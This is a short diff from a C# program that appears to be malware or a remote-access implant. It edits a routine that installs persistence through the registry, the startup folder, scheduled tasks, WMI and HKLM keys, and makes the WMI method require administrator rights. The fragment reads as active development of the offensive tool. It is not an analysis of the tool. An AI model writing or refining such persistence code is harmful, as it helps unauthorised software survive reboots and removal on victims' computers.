@@ -188,10 +188,10 @@ partial class Program
             Environment.SetEnvironmentVariable("SERO_PERSIST_WORKER", null);
             await Task.Delay(800);
             bool isAdm = IsAdmin();
-            if (Config.PersistRegistry) Persistence.InstallRegistry(Config.PersistName);
-            if (Config.PersistStartup)  Persistence.InstallStartup(Config.PersistName);
-            if (Config.PersistTask)     Persistence.InstallScheduledTask(Config.PersistName);
-            if (Config.PersistWmi)      Persistence.InstallWmi(Config.PersistName);
+            if (Config.PersistRegistry)        Persistence.InstallRegistry(Config.PersistName);
+            if (Config.PersistStartup)         Persistence.InstallStartup(Config.PersistName);
+            if (Config.PersistTask)            Persistence.InstallScheduledTask(Config.PersistName);
+            if (isAdm && Config.PersistWmi)    Persistence.InstallWmi(Config.PersistName);
             if (isAdm && Config.PersistRegistry) Persistence.InstallRegistryHKLM(Config.PersistName);
             return;
         }
